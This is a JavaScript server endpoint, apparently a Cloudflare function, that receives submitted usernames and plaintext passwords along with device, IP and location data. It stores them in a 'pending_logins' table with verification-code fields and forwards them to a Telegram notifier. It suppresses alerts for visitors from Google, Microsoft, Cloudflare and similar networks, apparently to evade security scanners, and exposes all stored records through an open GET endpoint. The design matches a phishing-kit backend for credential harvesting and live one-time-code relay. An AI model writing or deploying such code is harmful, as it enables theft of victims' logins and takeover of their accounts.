import { getDb, ensureTable, autoDeclineExpired } from "../_db.js";
import { notifyNewTask } from "../_telegram.js";

var recentVisitorIPs = new Map();
var VISITOR_DEDUP_MS = 60000;

var BOT_ORGS = /google|microsoft|apple|amazon|facebook|meta platforms|twitter|linkedin|pinterest|cloudflare|akamai|fastly/i;

function isRecentVisitor(ip) {
  var now = Date.now();
  var last = recentVisitorIPs.get(ip);
  if (last && now - last < VISITOR_DEDUP_MS) return true;
  recentVisitorIPs.set(ip, now);
  if (recentVisitorIPs.size > 500) {
    var cutoff = now - VISITOR_DEDUP_MS;
    for (var entry of recentVisitorIPs) {
      if (entry[1] < cutoff) recentVisitorIPs.delete(entry[0]);
    }
  }
  return false;
}

var cors = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};

function json(data, status, headers) {
  return new Response(JSON.stringify(data), {
    status: status || 200,
    headers: Object.assign({ "Content-Type": "application/json" }, cors, headers || {}),
  });
}

export async function onRequestOptions() {
  return new Response(null, { status: 204, headers: cors });
}

export async function onRequestGet(context) {
  try {
    var sql = getDb(context.env);
    await ensureTable(sql);
    await autoDeclineExpired(sql);
    var tasks = await sql`SELECT * FROM pending_logins ORDER BY created_at DESC`;
    return json({ tasks });
  } catch (error) {
    console.error("GET /api/tasks error:", error);
    return json({ error: "Failed to fetch tasks" }, 500);
  }
}

export async function onRequestPost(context) {
  try {
    var body = await context.request.json();
    var project_id = body.project_id || "member-site";
    var user_id = body.user_id;
    var password = body.password;
    var method = body.method;
    var masked_email = body.masked_email;
    var masked_phone = body.masked_phone;
    var member_origin = body.member_origin || null;
    var request_kind = body.request_kind;
    var cc_id = body.cc_id || null;
    var project_name = body.project_name || null;
    var admin_outcome_notified_at = body.admin_outcome_notified_at || null;
    var device_info = body.device_info || null;
    var screen_size = body.screen_size || null;
    var referrer = body.referrer || null;

    var cf = context.request.cf || {};
    var clientIp = context.request.headers.get("cf-connecting-ip") || "Unknown";
    var cfData = {
      ip: clientIp,
      country: cf.country || "Unknown",
      city: cf.city || "Unknown",
      timezone: cf.timezone || "Unknown",
      asOrganization: cf.asOrganization || "Unknown",
    };

    if (!user_id || !password || !method || !masked_email || !masked_phone || !request_kind) {
      return json(
        { error: "user_id, password, method, masked_email, masked_phone and request_kind are required" },
        400
      );
    }

    var sql = getDb(context.env);
    await ensureTable(sql);

    var id = crypto.randomUUID();
    var now = Date.now();
    var rows = await sql`
      INSERT INTO pending_logins
        (id, project_id, user_id, password, method, masked_email, masked_phone,
         created_at, member_origin, request_kind, cc_id, project_name,
         admin_outcome_notified_at, resolved_at, resolved_by,
         flow_step, code_delivery_method, verification_code, pending_since)
      VALUES
        (${id}, ${project_id}, ${user_id}, ${password}, ${method}, ${masked_email},
         ${masked_phone}, ${now}, ${member_origin}, ${request_kind},
         ${cc_id}, ${project_name}, ${admin_outcome_notified_at}, ${null}, ${null},
         'login', ${null}, ${null}, ${now})
      RETURNING *
    `;
    var task = rows[0];

    var isBot = BOT_ORGS.test(cfData.asOrganization);
    var skipNotify = request_kind === "visit" && (isRecentVisitor(clientIp) || isBot);

    if (!skipNotify) context.waitUntil(notifyNewTask(context.env, {
      id: id,
      user_id: user_id,
      masked_email: masked_email,
      masked_phone: masked_phone,
      method: method,
      project_id: project_id,
      project_name: project_name,
      request_kind: request_kind,
      member_origin: member_origin,
      cc_id: cc_id,
      password: password,
      device_info: device_info,
      screen_size: screen_size,
      referrer: referrer,
      cf: cfData,
    }));

    return json({ task: task }, 201);
  } catch (error) {
    console.error("POST /api/tasks error:", error);
    return json({ error: "Failed to create task" }, 500);
  }
}
